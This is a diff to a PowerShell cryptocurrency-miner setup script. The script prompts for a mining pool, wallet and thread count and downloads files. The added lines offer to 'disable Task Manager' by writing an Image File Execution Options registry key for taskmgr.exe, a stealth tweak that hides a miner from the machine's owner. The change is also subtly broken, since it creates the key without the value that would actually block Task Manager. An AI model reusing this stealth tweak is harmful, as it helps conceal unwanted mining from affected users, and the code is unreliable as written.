@@ -27,6 +27,14 @@ $pool = Read-Host "Enter pool address (e.g., pool.minexmr.com:443)"
 $wallet = Read-Host "Enter wallet address"
 $pass = Read-Host "Enter pool password"
 $threads = Read-Host "Enter thread count"
+$answer = Read-Host "Do you want to disable Task Manager? "
+$keyPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
+
+if ($answer -eq "1") {
+    New-Item -Path $keyPath -Force | Out-Null
+} else {
+    Remove-Item -Path $keyPath -Recurse -Force -ErrorAction SilentlyContinue
+}
 
 # Download files
 foreach ($file in $urls.Keys) {
